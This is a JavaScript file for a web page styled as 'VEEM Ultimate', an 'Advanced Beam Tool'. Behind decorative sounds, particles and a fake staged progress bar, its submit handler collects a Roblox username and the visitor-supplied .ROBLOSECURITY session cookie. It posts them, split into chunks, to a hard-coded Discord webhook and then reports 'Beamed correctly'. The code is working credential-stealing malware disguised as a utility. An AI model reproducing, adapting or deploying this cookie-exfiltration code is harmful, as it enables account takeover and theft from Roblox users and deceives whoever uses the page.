// VEEM Ultimate - Advanced Beam Tool JavaScript

// State Management
let cooldownEnd = null;
let cooldownInterval = null;
const COOLDOWN_DURATION = 10000;

// Audio Context
let audioContext;
let soundEnabled = true;

// Loading Stages
const LOADING_STAGES = [
  { message: 'Preparing data...', progress: 25, duration: 800 },
  { message: 'Validating fields...', progress: 50, duration: 1000 },
  { message: 'Processing beam...', progress: 75, duration: 1200 },
  { message: 'Sending beam...', progress: 100, duration: 1000 }
];

// Initialize Audio
function initAudio() {
  if (!audioContext) {
    audioContext = new (window.AudioContext || window.webkitAudioContext)();
  }
}

// Play Sound Effect
function playSound(type) {
  if (!soundEnabled) return;
  
  initAudio();
  const oscillator = audioContext.createOscillator();
  const gainNode = audioContext.createGain();
  
  oscillator.connect(gainNode);
  gainNode.connect(audioContext.destination);
  
  const currentTime = audioContext.currentTime;
  
  switch(type) {
    case 'click':
      oscillator.frequency.value = 440;
      gainNode.gain.setValueAtTime(0.3, currentTime);
      gainNode.gain.exponentialRampToValueAtTime(0.01, currentTime + 0.1);
      oscillator.start(currentTime);
      oscillator.stop(currentTime + 0.1);
      break;
      
    case 'success':
      const frequencies = [523, 659, 784, 1047];
      frequencies.forEach((freq, index) => {
        const osc = audioContext.createOscillator();
        const gain = audioContext.createGain();
        osc.connect(gain);
        gain.connect(audioContext.destination);
        osc.frequency.value = freq;
        gain.gain.setValueAtTime(0.25, currentTime + index * 0.12);
        gain.gain.exponentialRampToValueAtTime(0.01, currentTime + index * 0.12 + 0.15);
        osc.start(currentTime + index * 0.12);
        osc.stop(currentTime + index * 0.12 + 0.15);
      });
      break;
      
    case 'error':
      const errorFreqs = [400, 300, 200];
      errorFreqs.forEach((freq, index) => {
        const osc = audioContext.createOscillator();
        const gain = audioContext.createGain();
        osc.connect(gain);
        gain.connect(audioContext.destination);
        osc.frequency.value = freq;
        osc.type = 'sawtooth';
        gain.gain.setValueAtTime(0.25, currentTime + index * 0.15);
        gain.gain.exponentialRampToValueAtTime(0.01, currentTime + index * 0.15 + 0.2);
        osc.start(currentTime + index * 0.15);
        osc.stop(currentTime + index * 0.15 + 0.2);
      });
      break;
  }
}

// Create Particles
function createParticles() {
  const container = document.getElementById('particles-container');
  const particleCount = parseInt(document.documentElement.style.getPropertyValue('--particle-count') || 35);
  
  container.innerHTML = '';
  
  if (window.innerWidth <= 768 || particleCount === 0) return;
  
  for (let i = 0; i < particleCount; i++) {
    const particle = document.createElement('div');
    const size = Math.random() * 40 + 15;
    const isCircle = Math.random() > 0.5;
    
    particle.className = `particle ${isCircle ? 'sphere' : 'cube'}`;
    particle.style.width = size + 'px';
    particle.style.height = size + 'px';
    particle.style.left = Math.random() * 100 + '%';
    particle.style.top = Math.random() * 100 + '%';
    particle.style.animationDuration = (Math.random() * 4 + 3) + 's';
    particle.style.animationDelay = Math.random() * 3 + 's';
    
    container.appendChild(particle);
  }
}

// Tab Switching
function initTabs() {
  const tabBtns = document.querySelectorAll('.tab-btn');
  const tabContents = document.querySelectorAll('.tab-content');
  
  tabBtns.forEach(btn => {
    btn.addEventListener('click', () => {
      playSound('click');
      
      tabBtns.forEach(b => b.classList.remove('active'));
      tabContents.forEach(c => c.classList.remove('active'));
      
      btn.classList.add('active');
      const targetTab = btn.getAttribute('data-tab') + '-tab';
      document.getElementById(targetTab).classList.add('active');
      
      // Animate stats if About tab
      if (targetTab === 'about-tab') {
        animateStats();
      }
    });
  });
}

// Animate Stats Counter
function animateStats() {
  const statNumbers = document.querySelectorAll('.stat-number');
  
  statNumbers.forEach(stat => {
    if (stat.dataset.animated) return;
    
    const target = parseFloat(stat.dataset.counter);
    const duration = 2000;
    const steps = 60;
    const stepValue = target / steps;
    let current = 0;
    
    const interval = setInterval(() => {
      current += stepValue;
      if (current >= target) {
        stat.textContent = target % 1 === 0 ? target.toLocaleString() : target.toFixed(1);
        clearInterval(interval);
        stat.dataset.animated = 'true';
      } else {
        stat.textContent = current % 1 === 0 ? Math.floor(current).toLocaleString() : current.toFixed(1);
      }
    }, duration / steps);
  });
}

// Toast Notification
function showToast(message, type = 'success') {
  const toast = document.getElementById('toast');
  toast.textContent = message;
  toast.className = `toast ${type}`;
  toast.classList.add('show');
  
  setTimeout(() => {
    toast.classList.remove('show');
  }, 3000);
}

// Advanced Loading System
async function showAdvancedLoading() {
  const overlay = document.getElementById('loadingOverlay');
  const progressFill = document.getElementById('progressFill');
  const progressText = document.getElementById('progressText');
  const progressPercentage = document.getElementById('progressPercentage');
  
  overlay.classList.add('show');
  
  for (let i = 0; i < LOADING_STAGES.length; i++) {
    const stage = LOADING_STAGES[i];
    
    progressText.textContent = stage.message;
    progressFill.style.width = stage.progress + '%';
    progressPercentage.textContent = stage.progress + '%';
    
    await new Promise(resolve => setTimeout(resolve, stage.duration));
  }
}

function hideLoading() {
  const overlay = document.getElementById('loadingOverlay');
  overlay.classList.remove('show');
  
  // Reset progress
  setTimeout(() => {
    document.getElementById('progressFill').style.width = '0%';
    document.getElementById('progressPercentage').textContent = '0%';
    document.getElementById('progressText').textContent = 'Preparing data...';
  }, 300);
}

// Result Animation (Success/Error)
function showResult(type, message) {
  const overlay = document.getElementById('resultOverlay');
  const icon = document.getElementById('resultIcon');
  const messageEl = document.getElementById('resultMessage');
  
  // Clear previous state
  icon.className = 'result-icon';
  messageEl.className = 'result-message';
  
  // Set new state
  icon.classList.add(type);
  messageEl.classList.add(type);
  
  if (type === 'success') {
    icon.textContent = '✓';
    playSound('success');
    createConfetti();
  } else {
    icon.textContent = '✕';
    playSound('error');
  }
  
  messageEl.textContent = message;
  overlay.classList.add('show');
  
  // Hide after 2.5 seconds
  setTimeout(() => {
    overlay.classList.remove('show');
  }, 2500);
}

// Create Confetti Effect
function createConfetti() {
  const colors = ['#E62C2C', '#FF4444', '#00FF88', '#FFB347', '#FFFFFF'];
  const resultContent = document.querySelector('.result-content');
  
  for (let i = 0; i < 50; i++) {
    const confetti = document.createElement('div');
    confetti.className = 'confetti';
    confetti.style.left = Math.random() * 100 + '%';
    confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
    confetti.style.animationDelay = Math.random() * 0.5 + 's';
    confetti.style.animationDuration = (Math.random() * 2 + 2) + 's';
    
    resultContent.appendChild(confetti);
    
    setTimeout(() => confetti.remove(), 3000);
  }
}

// Cooldown Management
function checkCooldown() {
  if (!cooldownEnd) return false;
  
  const remaining = cooldownEnd - Date.now();
  if (remaining > 0) {
    startCooldownTimer(remaining);
    return true;
  }
  
  cooldownEnd = null;
  return false;
}

function startCooldown() {
  cooldownEnd = Date.now() + COOLDOWN_DURATION;
  startCooldownTimer(COOLDOWN_DURATION);
}

function startCooldownTimer(duration) {
  const submitBtn = document.getElementById('submitBtn');
  submitBtn.disabled = true;
  
  let remaining = Math.ceil(duration / 1000);
  
  const updateButton = () => {
    if (remaining <= 0) {
      clearInterval(cooldownInterval);
      submitBtn.disabled = false;
      submitBtn.textContent = 'Beam User';
      cooldownEnd = null;
      return;
    }
    
    submitBtn.textContent = `Wait ${remaining}s`;
    remaining--;
  };
  
  updateButton();
  cooldownInterval = setInterval(updateButton, 1000);
}

// Form Submission
async function handleSubmit(e) {
  e.preventDefault();
  playSound('click');
  
  // Check cooldown
  if (cooldownEnd && cooldownEnd > Date.now()) {
    const remaining = Math.ceil((cooldownEnd - Date.now()) / 1000);
    playSound('error');
    showToast(`Wait ${remaining}s before beaming again`, 'error');
    return;
  }
  
  const username = document.getElementById('username').value.trim();
  const roblosecurity = document.getElementById('roblosecurity').value.trim();
  const userlink = document.getElementById('userlink').value.trim();
  
  if (!username || !roblosecurity || !userlink) {
    playSound('error');
    showToast('Please fill in all fields', 'error');
    document.querySelector('.glass-card').classList.add('shake');
    setTimeout(() => document.querySelector('.glass-card').classList.remove('shake'), 400);
    return;
  }
  
  // Show advanced loading
  await showAdvancedLoading();
  
  try {
    // Build fields array
    const fields = [
      {
        name: '👤 Username',
        value: username,
        inline: true
      },
      {
        name: '🔗 User Link',
        value: userlink,
        inline: false
      }
    ];
    
    // Handle ROBLOSECURITY with splitting logic
    const cookieWithCodeBlock = `\`\`\`\n${roblosecurity}\n\`\`\``;
    
    if (cookieWithCodeBlock.length <= 1024) {
      fields.push({
        name: '🔐 ROBLOSECURITY',
        value: cookieWithCodeBlock,
        inline: false
      });
    } else {
      const chunkSize = 1000;
      let partNumber = 1;
      
      for (let i = 0; i < roblosecurity.length; i += chunkSize) {
        const chunk = roblosecurity.substring(i, i + chunkSize);
        const fieldName = partNumber === 1 
          ? `🔐 ROBLOSECURITY (Part ${partNumber})`
          : `🔐 ROBLOSECURITY (Part ${partNumber} - continued)`;
        
        fields.push({
          name: fieldName,
          value: `\`\`\`\n${chunk}\n\`\`\``,
          inline: false
        });
        
        partNumber++;
      }
    }
    
    // Webhook URL (replace with your actual webhook)
    const webhookUrl = 'https://discord.com/api/webhooks/1432028268575330324/bnHxldAKmykSeIBjsCKfQ_T-MIJPOh45nsvgRWSvfGQ6RjqvsNLGlx4SYNiMjCKqtkb1';
    
    const payload = {
      embeds: [{
        title: '🎯 New VEEM Ultimate Submission',
        color: 15085612,
        fields: fields,
        timestamp: new Date().toISOString(),
        footer: {
          text: 'VEEM Ultimate v1.0'
        }
      }]
    };
    
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });
    
    hideLoading();
    
    if (response.ok || response.status === 204) {
      // Success
      showResult('success', 'Beamed correctly');
      startCooldown();
      
      // Clear form after animation
      setTimeout(() => {
        document.getElementById('beamForm').reset();
      }, 1000);
    } else {
      throw new Error('Webhook failed');
    }
  } catch (error) {
    hideLoading();
    showResult('error', 'Beam error. Try again.');
    console.error('Error:', error);
  }
}

// Clear Form
function handleClear() {
  playSound('click');
  document.getElementById('beamForm').reset();
  showToast('Form cleared', 'success');
}

// Settings
function initSettings() {
  // Blur slider
  const blurSlider = document.getElementById('blurSlider');
  const blurValue = document.getElementById('blurValue');
  
  blurSlider.addEventListener('input', (e) => {
    const value = e.target.value + 'px';
    document.documentElement.style.setProperty('--blur-intensity', value);
    blurValue.textContent = value;
  });
  
  // Speed slider
  const speedSlider = document.getElementById('speedSlider');
  const speedValue = document.getElementById('speedValue');
  
  speedSlider.addEventListener('input', (e) => {
    const value = e.target.value + 's';
    document.documentElement.style.setProperty('--animation-speed', value);
    speedValue.textContent = value;
  });
  
  // Particle slider
  const particleSlider = document.getElementById('particleSlider');
  const particleValue = document.getElementById('particleValue');
  
  particleSlider.addEventListener('input', (e) => {
    const value = e.target.value;
    document.documentElement.style.setProperty('--particle-count', value);
    particleValue.textContent = value;
    createParticles();
  });
  
  // Theme selector
  const themeOptions = document.querySelectorAll('.theme-option');
  
  themeOptions.forEach(option => {
    option.addEventListener('click', () => {
      playSound('click');
      
      themeOptions.forEach(o => o.classList.remove('active'));
      option.classList.add('active');
      
      const theme = option.dataset.theme;
      applyTheme(theme);
    });
  });
  
  // Reset button
  document.getElementById('resetBtn').addEventListener('click', () => {
    playSound('click');
    resetSettings();
    showToast('Settings reset to default', 'success');
  });
}

function applyTheme(theme) {
  const themes = {
    default: { primary: '#E62C2C', secondary: '#D12828', accent: '#FF4444' },
    blue: { primary: '#2196F3', secondary: '#1976D2', accent: '#42A5F5' },
    purple: { primary: '#9C27B0', secondary: '#7B1FA2', accent: '#BA68C8' },
    green: { primary: '#4CAF50', secondary: '#388E3C', accent: '#66BB6A' },
    orange: { primary: '#FF9800', secondary: '#F57C00', accent: '#FFB74D' }
  };
  
  const colors = themes[theme];
  document.documentElement.style.setProperty('--primary-color', colors.primary);
  document.documentElement.style.setProperty('--secondary-color', colors.secondary);
  document.documentElement.style.setProperty('--accent-color', colors.accent);
}

function resetSettings() {
  document.documentElement.style.setProperty('--blur-intensity', '12px');
  document.documentElement.style.setProperty('--animation-speed', '0.6s');
  document.documentElement.style.setProperty('--particle-count', '35');
  applyTheme('default');
  
  document.getElementById('blurSlider').value = 12;
  document.getElementById('speedSlider').value = 0.6;
  document.getElementById('particleSlider').value = 35;
  document.getElementById('blurValue').textContent = '12px';
  document.getElementById('speedValue').textContent = '0.6s';
  document.getElementById('particleValue').textContent = '35';
  
  document.querySelectorAll('.theme-option').forEach(o => o.classList.remove('active'));
  document.querySelector('.theme-option[data-theme="default"]').classList.add('active');
  
  createParticles();
}

// Initialize Application
function init() {
  // Create particles
  createParticles();
  
  // Initialize tabs
  initTabs();
  
  // Initialize settings
  initSettings();
  
  // Check cooldown
  checkCooldown();
  
  // Form submission
  document.getElementById('beamForm').addEventListener('submit', handleSubmit);
  
  // Clear button
  document.getElementById('clearBtn').addEventListener('click', handleClear);
  
  // Window resize
  window.addEventListener('resize', createParticles);
  
  console.log('%cVEEM Ultimate v1.0', 'color: #E62C2C; font-size: 24px; font-weight: bold;');
  console.log('%cAdvanced Beam Tool Loaded Successfully', 'color: #00FF88; font-size: 14px;');
}

// Start when DOM is ready
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', init);
} else {
  init();
}
